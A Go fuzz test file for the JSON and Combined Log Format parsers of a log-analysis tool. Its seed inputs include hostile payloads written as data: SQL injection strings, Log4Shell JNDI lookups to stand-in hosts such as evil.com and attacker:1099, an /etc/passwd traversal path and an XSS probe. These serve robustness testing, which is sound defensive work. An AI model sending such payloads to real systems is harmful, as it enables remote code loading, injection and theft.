package input_test

import (
	"testing"
	"unicode/utf8"

	"github.com/xoelrdgz/logradar/internal/adapters/input"
)

func FuzzJSONParser(f *testing.F) {
	parser := input.NewJSONParser()

	seeds := []string{
		`{"timestamp":"2024-01-01T00:00:00Z","remote_addr":"192.168.1.1","request_method":"GET","request_uri":"/test","status":200}`,
		`{"timestamp":"2024-01-01T00:00:00Z","remote_addr":"::1","request_method":"POST","request_uri":"/api/data","status":201}`,

		`{}`,
		`{"timestamp":""}`,
		`{"remote_addr":""}`,

		`{"status":9999999999999999999999999999999999999999999999999999}`,
		`{"body_bytes_sent":-9999999999999999999999}`,

		`{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":{}}}}}}}}}}}`,
		`{"request_uri":"\xff\xfe"}`,
		`{"http_user_agent":"\x80\x81\x82"}`,

		`{"request_uri":"` + stringRepeat("A", 10000) + `"}`,

		`{"request_uri":"/?id=1' OR '1'='1"}`,
		`{"request_body":"'; DROP TABLE users;--"}`,
		`{"http_user_agent":"${jndi:ldap://evil.com/}"}`,
		`{"http_referer":"${jndi:rmi://attacker:1099/obj}"}`,

		`{"request_uri":"/\r\n\t\b\f"}`,
		`{"http_cookie":"session=\x00\x01\x02"}`,

		`{"incomplete": `,
		`{"unclosed": "string`,
		`{{{`,
		`}}}`,
		`null`,
		`[]`,
		`""`,
		`123`,
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, data string) {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("parser panicked on input %q: %v", truncate(data, 100), r)
			}
		}()

		entry, err := parser.Parse(data)

		if err == nil && entry != nil {
			if len(entry.Path) > 65536 {
				t.Errorf("path length exceeded limit: %d", len(entry.Path))
			}
			if len(entry.UserAgent) > 8192 {
				t.Errorf("user agent length exceeded limit: %d", len(entry.UserAgent))
			}
			if len(entry.Body) > 1048576 {
				t.Errorf("body length exceeded limit: %d", len(entry.Body))
			}

			if !utf8.ValidString(entry.Path) {
				t.Errorf("path contains invalid UTF-8")
			}
		}
	})
}

func FuzzCombinedLogParser(f *testing.F) {
	parser := input.NewCombinedLogParser()

	seeds := []string{
		`192.168.1.1 - - [01/Jan/2024:00:00:00 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"`,
		`10.0.0.1 - admin [01/Jan/2024:12:30:00 +0000] "POST /api/login HTTP/1.1" 401 500 "http://example.com" "curl/8.0"`,

		`- - - [01/Jan/2024:00:00:00 +0000] "GET / HTTP/1.1" 200 0 "-" "-"`,
		`::1 - - [01/Jan/2024:00:00:00 +0000] "GET / HTTP/1.1" 200 0 "-" "-"`,

		`192.168.1.1 - - [99/XXX/9999:99:99:99 +9999] "GET / HTTP/1.1" 200 0`,
		`192.168.1.1 - - [] "GET / HTTP/1.1" 200 0`,

		`192.168.1.1 - - [01/Jan/2024:00:00:00 +0000] "GET / HTTP/1.1" 99999999999999 0`,

		`192.168.1.1 - - [01/Jan/2024:00:00:00 +0000] "GET /../../../etc/passwd HTTP/1.1" 200 0`,
		`192.168.1.1 - - [01/Jan/2024:00:00:00 +0000] "GET /?q=<script>alert(1)</script> HTTP/1.1" 200 0`,

		`192.168.1.1 - - [01/Jan/2024:00:00:00 +0000] "GET /`,
		`192.168.1.1 - - [01/Jan/2024:00:00:00 +0000] "`,

		`192.168.1.1 - - [01/Jan/2024:00:00:00 +0000] "GET / HTTP/1.1" 200 0 "-" "` + stringRepeat("A", 10000) + `"`,

		"\x00\x01\x02\x03",
		"\xff\xfe\xfd\xfc",

		"",
		" ",
		"-",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, data string) {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("CLF parser panicked on input %q: %v", truncate(data, 100), r)
			}
		}()

		entry, err := parser.Parse(data)

		if err == nil && entry != nil {
			if len(entry.Path) > 65536 {
				t.Errorf("path too long: %d", len(entry.Path))
			}
		}
	})
}

func FuzzAutoDetectParser(f *testing.F) {
	parser := input.NewAutoDetectParser()

	seeds := []string{
		`{"timestamp":"2024-01-01T00:00:00Z","remote_addr":"1.1.1.1"}`,
		`1.1.1.1 - - [01/Jan/2024:00:00:00 +0000] "GET / HTTP/1.1" 200 0`,
		`{garbage`,
		`1.1.1.1 {weird}`,
		"\x00\xff",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, data string) {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("auto-detect parser panicked: %v", r)
			}
		}()

		parser.Parse(data)
	})
}

func stringRepeat(s string, n int) string {
	result := ""
	for i := 0; i < n; i++ {
		result += s
	}
	return result
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
